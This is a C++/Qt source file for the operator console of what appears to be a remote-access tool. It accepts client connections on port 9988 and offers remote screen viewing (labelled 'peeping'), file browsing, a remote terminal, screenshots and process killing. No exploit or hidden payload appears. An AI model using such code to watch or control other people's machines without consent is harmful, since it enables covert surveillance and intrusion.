#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QDockWidget>
#include <QTimer>
#include <QInputDialog>
#include <QDebug>
#include <QKeyEvent>
#include <QListWidgetItem>
#include <QDialog>
#include <QDir>

void MainWindow::initUi()
{
    ui->menuBar->setVisible(false);

    QActionGroup *group = new QActionGroup(this);
    group->addAction(ui->action_defin_high);
    group->addAction(ui->action_comm);
    group->addAction(ui->action_blur);

    m_scorllArea = new QScrollArea(this);
    m_scorllArea->setBackgroundRole(QPalette::Dark);  // 背景色 200862

    //开始布局
    setCentralWidget(m_scorllArea);

    //添加右键菜单
    m_pMenu = new QMenu(this);
    m_actStart = m_pMenu->addAction("开始窥屏");
    m_actStop = m_pMenu->addAction("停止窥屏");

    //右边在线成员
    dockRight = new QDockWidget(tr("在线成员"), this);
    dockRight->setFeatures(QDockWidget::DockWidgetFloatable | QDockWidget::DockWidgetMovable);
    dockRight->setAllowedAreas(Qt::LeftDockWidgetArea | Qt::RightDockWidgetArea);
    ui->listWidget->setMaximumWidth(200);
    dockRight->setWidget(ui->listWidget);
    addDockWidget(Qt::RightDockWidgetArea, dockRight);

    connect(m_actStart, &QAction::triggered, this, &MainWindow::OnScreen);
    connect(m_actStop, &QAction::triggered, this, &MainWindow::OnStopScreen);

    //信号槽
    connect(this, &MainWindow::sigUpdateList, this, &MainWindow::slotUpdateList);
    connect(this, &MainWindow::sigShowMsg, this, &MainWindow::slotShowMsg);
    connect(this, &MainWindow::sigMsgBox, this, &MainWindow::slotMsgBox);
    connect(this, &MainWindow::sigCreateView, this, &MainWindow::createView);
    connect(this, &MainWindow::sigReleaseUi, this, &MainWindow::releaseUi);
    connect(this, &MainWindow::sigDisableActStart, this, &MainWindow::disableActStart);
    connect(this, &MainWindow::sigAddClientItem, this, &MainWindow::addClientItem);
    connect(this, &MainWindow::sigRemoveClientItem, this, &MainWindow::removeClientItem);

    //屏幕显示
    m_screen = new MyShowScreen(this);
    connect(this, &MainWindow::sigFlushImg, m_screen, &MyShowScreen::flush);
    m_pPrevSender = nullptr;
}

void MainWindow::startServer()
{
    try {
        //
        m_pServer = new MyServer(io_context, 9988);

        //accept callback
        auto callbackAcceptProc = [this](tcp::socket *ps)
        {
            //createUI
            auto map = m_pServer->clients();
            //UI thread cerate UI
            emit sigCreateView(map[ps]);
            //get endpoint
            tcp::endpoint pt = ps->remote_endpoint();
            QString name = QString::asprintf("%s:%d", pt.address().to_string().c_str(), pt.port());
            //show text on statubar
            emit this->sigShowMsg(name + " connected...");
            //add client
            emit this->sigAddClientItem(ps);
        };

        //Recv Packet process
        auto callbackPacketProc = [this](PACKET *pkt, MyPacketSender *sender, MyClientSession *client) -> bool
        {
            //处理包
            return packetProc(pkt, sender, client);
        };

        //Recv Packet process
        auto callbackExitProc = [this](MyClientSession* client, tcp::endpoint pt) -> bool
        {
            //不能再被使用
            if (m_pPrevSender == client->sender())
            {
                emit sigDisableActStart(false);
                m_pPrevSender = nullptr;
            }

            //显示状态
            emit sigShowMsg(QString::asprintf("%s:%d", pt.address().to_string().c_str(), pt.port()) + " client quit...");

            //在list中移除
            emit this->sigRemoveClientItem(new tcp::endpoint(pt));

            //删除对象
            emit this->sigReleaseUi(client);
            return true;
        };

        //Write Process
        auto callbackWriteProc = [this](tcp::socket* ps, boost::system::error_code ec, size_t len)
        {
            if (ec)
            {
                qDebug() << "Write Error : " << QString::fromUtf8(ec.message().c_str());
            }
            else
            {
                qDebug() << "write data : " << len;
            }
        };

        //when accept success exec
        m_pServer->do_accept(callbackAcceptProc, callbackPacketProc, callbackExitProc, callbackWriteProc);

        //启动心跳检测线程
        std::thread([&](){
            while(true)
            {
                //获取时间
                long lCurTime = time(nullptr);
                //遍历检测是否超时
                for (auto c : m_pServer->clients())
                {
                    //差值
                    long elapsed = lCurTime - c->getPrevHeartTime();
                    //大于2分钟未响应就踢掉此客户端
                    if (elapsed > 120)
                    {
                        //删除客户端
                        m_pServer->removeClient(c->sender()->socket());
                        //释放资源
                        c->close();
                        //跳出
                        break;
                    }
                }
                //5秒一次心跳检测
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }).detach();

        //start async process
        m_pServer->start();
    } catch (std::exception &e) {
        qDebug() << "Exception: " << e.what() << "\n";
    }
}

bool MainWindow::packetProc(PACKET *pkt, MyPacketSender *sender, MyClientSession *client)
{
    //拿到包开始处理
    switch (pkt->byCmdMain) {
        case ON_SCREEN:
        {
            if (pkt->byCmdSub == START)
            {
                //客户端宽度
                int nClientWidth = reinterpret_cast<int*>(pkt->Data)[0];
                //客户端高度
                int nClientHeight = reinterpret_cast<int*>(pkt->Data)[1];
                //设置到显示窗口
                m_screen->SetScreenAttribute(sender, nClientHeight, nClientWidth, reinterpret_cast<const uchar*>(pkt->Data + 8), static_cast<int>(pkt->uLength) - 8);
                //刷新显示
                emit sigFlushImg();
            }
            else if (pkt->byCmdSub == STOP)
            {
                emit sigDisableActStart(false);
            }
        }
        break;
        case ON_FILEVIEW:
        {
            //拿文件数据
            char* szXml = pkt->Data;
            qDebug() << pkt->uLength;
            client->showFileView(szXml);
            //刷新显示
            emit client->sigFlushFile();
        }
        break;
        case ON_SHOT:
        {
            saveShot(reinterpret_cast<const uchar*>(pkt->Data), pkt->uLength);
        }
        break;
        case ON_PROCESS:
        {
            if (pkt->byCmdSub == VIEW)
            {
                //更新数据
                client->showProcessView(pkt->Data);
                //刷新显示
                emit client->sigFlushProcess();
            }
            else if (pkt->byCmdSub == KILLPROCESS)
            {
                if (reinterpret_cast<int *>(pkt->Data)[0] == false)
                {
                    emit sigMsgBox(QString::asprintf("操作失败,错误码%d", reinterpret_cast<int *>(pkt->Data)[1]));
                }
                else
                {
                    emit sigShowMsg("操作成功...");
                }
            }
        }
        break;
        case ON_CMD:
        {
            if (pkt->byCmdSub == INIT)
            {
                if (reinterpret_cast<int *>(pkt->Data)[0] == false)
                {
                    emit sigMsgBox("远程终端失败!");
                }
                else
                {
                    emit client->sigFlushCmd("");
                    emit sigShowMsg("操作成功...");
                }
            }
            else if (pkt->byCmdSub == EXEC)
            {
                QString str = QString::fromLocal8Bit(pkt->Data, static_cast<int>(pkt->uLength));
#ifdef __WIN
                emit client->sigFlushCmd(str);
#else
                emit client->sigFlushCmd(QTextCodec::codecForName("GBK")->toUnicode(pkt->Data));
#endif
            }
        }
        break;
        case ON_HEARTBEAT:
        {
            //记录每次心跳的时间点
            client->onHeart();
        }
        break;
    }
    return true;
}

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    //init UI
    initUi();

    //start async network server
    startServer();
}

void MainWindow::saveShot(const uchar *data, uint nLen)
{
    //当前图片数据
    QPixmap img;
    img.loadFromData(data, nLen);
    //打开文件
    img.save("./screenshot.bmp", "BMP");
    //通知
    emit sigShowMsg("截图已保存到: " + QDir::currentPath() + "/screenshot.bmp");
}

MainWindow::~MainWindow()
{
    delete ui;
}

MyPacketSender *MainWindow::getCurSender()
{
    MyClientSession* c = getCurClientSession();
    if (c == nullptr)
    {
        return nullptr;
    }
    return c->sender();
}

MyClientSession *MainWindow::getCurClientSession()
{
    //拿当前选中
    QListWidgetItem *item = ui->listWidget->currentItem();
    if (item == nullptr)
    {
        return nullptr;
    }
    unsigned int loint = item->data(Qt::UserRole + 1).toUInt();
    unsigned int hiint = item->data(Qt::UserRole + 2).toUInt();
    long lptr = MYMAKELONG(hiint, loint);
    tcp::socket *s = reinterpret_cast<tcp::socket *>(lptr);
    if (s == nullptr) return nullptr;

    auto map = m_pServer->clients();
    return map[s];
}

void MainWindow::on_listWidget_customContextMenuRequested(const QPoint &)
{
    m_pMenu->exec(QCursor::pos());
}

void MainWindow::slotUpdateList()
{
    //清空列表
    ui->listWidget->clear();

    //循环添加
    auto map = m_pServer->clients();
    auto list = map.keys();
    for (auto c : list)
    {
        //添加
        QListWidgetItem *item = new QListWidgetItem();
        item->setIcon(QIcon(":/res/user.png"));
        tcp::endpoint pt = c->remote_endpoint();
        QString name = QString::asprintf("%s:%d", pt.address().to_string().c_str(), pt.port());
        item->setText(name);
        //For compatibility with 64-bit systems
        long data = reinterpret_cast<long>(c);
        unsigned int loint = MYLOINT(data);
        unsigned int hiint = MYHIINT(data);
        item->setData(Qt::UserRole + 1, loint);
        item->setData(Qt::UserRole + 2, hiint);
        ui->listWidget->addItem(item);
    }
    //设置标题
    dockRight->setWindowTitle(QString::asprintf("在线成员 [%d]", list.size()));
}

void MainWindow::OnScreen()
{
    //设置屏幕标识
    m_screen->m_lb->setScreenFlag(true);
    MyPacketSender *s = getCurSender();
    if (s == nullptr)
    {
        return;
    }

    QListWidgetItem *item = ui->listWidget->currentItem();
    item->setIcon(QIcon(":/res/scan.png"));
    m_pPrevItem = item;

    m_actStart->setDisabled(true);
    s->setScreen(true);
    s->sendToScreen(m_screen->m_nDefinition);
    m_pPrevSender = s;
}

void MainWindow::OnStopScreen()
{
    if (m_pPrevSender == nullptr)
    {
        return;
    }
    m_pPrevSender->setScreen(false);
    m_pPrevSender->sendToScreenStop();
}

void MainWindow::slotShowMsg(QString msg)
{
    ui->statusBar->showMessage(msg);
}

void MainWindow::slotMsgBox(QString msg)
{
    QMessageBox::warning(nullptr, "error", msg);
}

void MainWindow::createView(MyClientSession *client)
{
    client->createUi(this);
}

void MainWindow::releaseUi(MyClientSession *client)
{
    delete client;
}

void MainWindow::disableActStart(bool flag)
{
    m_actStart->setDisabled(flag);
    if (flag == false)
    {
        ui->actions_control->setChecked(false);
        if (m_pPrevItem != nullptr)
        {
            m_pPrevItem->setIcon(QIcon(":/res/user.png"));
        }
    }
    m_pPrevItem = nullptr;
    m_pPrevSender = nullptr;
}

void MainWindow::removeClientItem(tcp::endpoint *pt)
{
    if (pt == nullptr)
        return;

    QString name = QString::asprintf("%s:%d", pt->address().to_string().c_str(), pt->port());
    QList<QListWidgetItem*> list = ui->listWidget->findItems(name, Qt::MatchExactly);
    for (auto i : list)
    {
        ui->listWidget->takeItem(ui->listWidget->row(i));
    }
    //设置标题
    dockRight->setWindowTitle(QString::asprintf("在线成员 [%d]", ui->listWidget->count()));

    //释放
    delete pt;
}

void MainWindow::addClientItem(tcp::socket *ps)
{
    //添加
    QListWidgetItem *item = new QListWidgetItem();
    item->setIcon(QIcon(":/res/user.png"));
    tcp::endpoint pt = ps->remote_endpoint();
    QString name = QString::asprintf("%s:%d", pt.address().to_string().c_str(), pt.port());
    item->setText(name);
    //For compatibility with 64-bit systems
    long data = reinterpret_cast<long>(ps);
    unsigned int loint = MYLOINT(data);
    unsigned int hiint = MYHIINT(data);
    item->setData(Qt::UserRole + 1, loint);
    item->setData(Qt::UserRole + 2, hiint);
    ui->listWidget->addItem(item);
    //设置标题
    dockRight->setWindowTitle(QString::asprintf("在线成员 [%d]", ui->listWidget->count()));
}

void MainWindow::on_actions_screen_triggered()
{
    OnScreen();
}

void MainWindow::on_action_file_triggered()
{
    MyClientSession *c = getCurClientSession();
    if (c == nullptr)
    {
        return;
    }
    slotShowMsg("正在请求远程文件...");
    c->openFileView();
}

void MainWindow::on_action_cmd_triggered()
{
    MyPacketSender *s = getCurSender();
    if (s == nullptr)
    {
        return;
    }
    slotShowMsg("正在请求远程终端...");
    s->sendToCmdInit();
}

void MainWindow::on_action_exec_triggered()
{

}

void MainWindow::on_action_shot_triggered()
{
    MyPacketSender *s = getCurSender();
    if (s == nullptr)
    {
        return;
    }
    slotShowMsg("正在远程截图...");
    s->sendToShot();
}

void MainWindow::on_action_process_triggered()
{
    MyPacketSender *s = getCurSender();
    if (s == nullptr)
    {
        return;
    }
    slotShowMsg("正在获取远程进程信息...");
    s->sendToProcess();
}

void MainWindow::on_action_defin_high_triggered()
{
    m_screen->m_nDefinition = 3;
}

void MainWindow::on_action_comm_triggered()
{
    m_screen->m_nDefinition = 2;
}

void MainWindow::on_action_blur_triggered()
{
    m_screen->m_nDefinition = 1;
}
